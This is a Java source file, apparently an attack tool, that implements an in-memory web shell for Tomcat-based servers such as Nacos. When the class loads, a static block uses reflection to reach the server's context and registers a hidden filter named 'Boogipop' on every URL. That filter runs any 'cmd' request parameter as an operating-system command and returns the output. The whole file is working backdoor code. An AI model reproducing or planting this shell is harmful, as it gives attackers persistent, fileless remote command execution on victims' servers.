
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

public class NacosControllerMemShell {
    final String name="Boogipop";
    // 第一个构造函数
    String uri;
    String serverName="localhost";
    StandardContext standardContext;
    static {
        try {
            new NacosControllerMemShell();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
    public static Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {
                // field不存在，错误不抛出，测试时可以抛出
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public NacosControllerMemShell() throws Exception {
        getStandardContext();
    }

    public void getStandardContext() throws NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, ClassNotFoundException {
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = getField(thread, "target");
                HashMap children;
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                } catch (Exception e) {
                }
                if (jioEndPoint == null) {
                    try {
                        jioEndPoint = getField(target, "endpoint");
                    } catch (Exception e) {
                        return;
                    }
                }
                Object service = getField(getField(getField(
                        getField(getField(jioEndPoint, "handler"), "proto"),
                        "adapter"), "connector"), "service");
                Object engine = null;
                try {
                    engine = getField(service, "container");
                } catch (Exception e) {
                }
                if (engine == null) {
                    engine = getField(service, "engine");
                }

                children = (HashMap) getField(engine, "children");
                Object standardHost = children.get(this.serverName);

                children = (HashMap) getField(standardHost, "children");
                Iterator iterator = children.keySet().iterator();
                while (iterator.hasNext()) {
                    String contextKey = (String) iterator.next();
                    standardContext = (StandardContext) children.get(contextKey);
                    Field Configs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
                    Configs.setAccessible(true);
                    Map filterConfigs = (Map) Configs.get(standardContext);
                    if (filterConfigs.get(name) == null){
                        //开始添加Filter过滤器
                        Filter filter = new Filter() {
                            @Override
                            public void init(FilterConfig filterConfig) throws ServletException {

                            }

                            @Override
                            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                                HttpServletRequest req = (HttpServletRequest) servletRequest;
                                HttpServletResponse response = (HttpServletResponse) servletResponse;
                                //定义了恶意的FIlter过滤器，在dofilter方法执行恶意代码
                                if (req.getParameter("cmd") != null){
                                    Process process = Runtime.getRuntime().exec(req.getParameter("cmd"));
                                    java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                                            new java.io.InputStreamReader(process.getInputStream()));
                                    StringBuilder stringBuilder = new StringBuilder();
                                    String line;
                                    while ((line = bufferedReader.readLine()) != null) {
                                        stringBuilder.append(line + '\n');
                                    }
                                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                                    servletResponse.getOutputStream().flush();
                                    servletResponse.getOutputStream().close();
                                    return;
                                }
                                filterChain.doFilter(servletRequest,servletResponse);
                            }

                            @Override
                            public void destroy() {

                            }

                        };

                        FilterDef filterDef = new FilterDef();
                        filterDef.setFilter(filter);
                        filterDef.setFilterName(name);
                        filterDef.setFilterClass(filter.getClass().getName());
                        /**
                         * 将filterDef添加到filterDefs中
                         */
                        standardContext.addFilterDef(filterDef);

                        FilterMap filterMap = new FilterMap();
                        filterMap.addURLPattern("/*");
                        filterMap.setFilterName(name);
                        filterMap.setDispatcher(DispatcherType.REQUEST.name());

                        standardContext.addFilterMapBefore(filterMap);
                        /**
                         * 添加FilterMap
                         */
                        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
                        constructor.setAccessible(true);
                        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

                        filterConfigs.put(name,filterConfig);
                        /**
                         * 反射获取ApplicationFilterConfig对象，往filterConfigs中放入filterConfig
                         */
                        System.out.println("Inject Success !");
                    }
                    return;
                }
            }
        }
    }

    public static void main(String[] args) {

    }
}